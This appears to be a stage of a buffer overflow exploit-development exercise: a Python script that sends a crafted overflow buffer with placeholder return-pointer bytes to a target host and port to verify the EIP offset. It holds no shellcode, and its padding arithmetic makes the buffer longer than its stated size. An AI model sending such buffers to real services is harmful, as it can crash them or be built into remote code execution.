#!/usr/bin/env python3
# stage 4 verify the offset
import socket,sys


RHOST = sys.argv[1]
RPORT = int(sys.argv[2])


# Handle Payload 
offset = 146
total_buff_size = 650

buff          = b""
lead_padding  = b"\x4E" * (offset - len(buff))                 # lead padding
eip           = b"\x42" * 4                                    # saved return pointer overwrite (EIP/SRP) 
esp           = b"\x43" * 4                                    # where esp should be pointing
postfix       = b"\n"              
trail_padding = b"\x44" * (total_buff_size - len(buff))


# handle payload
buff += lead_padding 
buff += eip 
buff += esp 
buff += trail_padding
buff += postfix 


# handle connection 
print("[+] - Sendng Payload - [ {} Bytes ]".format(len(buff)))


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))
s.send(buff)
s.close()
